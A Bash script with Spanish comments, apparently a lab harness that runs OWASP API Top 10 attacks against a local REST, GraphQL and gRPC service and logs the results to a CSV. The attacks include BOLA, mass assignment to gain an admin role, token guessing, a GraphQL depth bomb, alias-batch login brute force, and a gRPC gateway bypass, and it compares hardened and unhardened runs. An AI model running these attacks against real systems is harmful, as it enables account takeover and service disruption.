#!/bin/bash

ETIQUETA=${1:-manual}

# Usamos 127.0.0.1 en lugar de localhost para evitar conflictos de resolución IPv6 con certificados autofirmados
if [ "$ETIQUETA" = "blindado" ]; then
    REST_BASE="https://127.0.0.1:8080"
    CURL_OPTS=(-k -sS --connect-timeout 5 --max-time 10)
else
    REST_BASE="http://127.0.0.1:8080"
    CURL_OPTS=(-sS --connect-timeout 5 --max-time 10)
fi

GQL_URL="http://127.0.0.1:4000/graphql"
GRPC_HOST="127.0.0.1"
GRPC_PUERTO=50051

if [ ! -f results.csv ]; then
    echo "timestamp,ataque,objetivo,http_status,resultado,detalle" > results.csv
fi

echo "== Rol 4: corrida [$ETIQUETA] =========================================="

echo "-- Registrando usuario víctima y obteniendo token atacante --"

curl "${CURL_OPTS[@]}" -X POST "$REST_BASE/api/v1/registro" \
  -H "Content-Type: application/json" \
  -d '{"nombre":"victima","correo":"victima@test.com","password":"x"}' \
  > /dev/null || true

curl "${CURL_OPTS[@]}" -X POST "$REST_BASE/api/v1/registro" \
  -H "Content-Type: application/json" \
  -d '{"nombre":"atacante","correo":"atac@test.com","password":"x"}' \
  > /dev/null || true

LOGIN=$(curl "${CURL_OPTS[@]}" -X POST "$REST_BASE/api/v1/login" \
  -H "Content-Type: application/json" \
  -d '{"correo":"atac@test.com","password":"x"}' || true)

RAW_TOKEN=$(echo "$LOGIN" | grep -o '"token":"[^"]*"' | cut -d'"' -f4 || true)

if [ -z "$RAW_TOKEN" ]; then
    echo "WARNING: No se pudo obtener token. Respuesta: $LOGIN"
    TOKEN="Bearer TOKEN_INVALIDO"
else
    TOKEN="Bearer $RAW_TOKEN"
    echo "Token obtenido: $TOKEN"
fi

echo "-- API1 BOLA --"
./rest_bola "$REST_BASE" "/api/v1/usuarios/usr-" "$TOKEN" 1 1 || true

echo "-- API3 Mass assignment --"
./rest_mass_assignment "$REST_BASE/api/v1/usuarios/usr-1" "$TOKEN" \
    nombre="hacker" rol="admin" || true

echo "-- API2 Auth debil (sin token) --"
./rest_auth_debil sin-token "$REST_BASE/api/v1/perfil" || true

echo "-- API2 Auth debil (adivinar) --"
./rest_auth_debil adivinar "$REST_BASE/api/v1/perfil" "tok-usr-1-" 1 20 || true

echo "-- API8 Introspeccion GraphQL --"
./graphql_introspection "$GQL_URL" "$RAW_TOKEN" || true

echo "-- API4 Bomba de profundidad GraphQL --"
./graphql_depth_bomb "$GQL_URL" subasta vendedor.subastas 15 || true

echo "-- API6 Alias batch en login GraphQL --"
yes "x" | head -n 100 > /tmp/dic.txt
./graphql_alias_batch "$GQL_URL" "atac@test.com" /tmp/dic.txt 50 || true

echo "-- API9 gRPC reflection --"
./grpc_reflection "$GRPC_HOST" "$GRPC_PUERTO" || true

echo "-- API5 gRPC bypass del gateway --"
./grpc_bypass_gateway "$GRPC_HOST" "$GRPC_PUERTO" subasta-demo usuario-atacante 100000 || true

echo "== listo, ver results.csv ==============================================="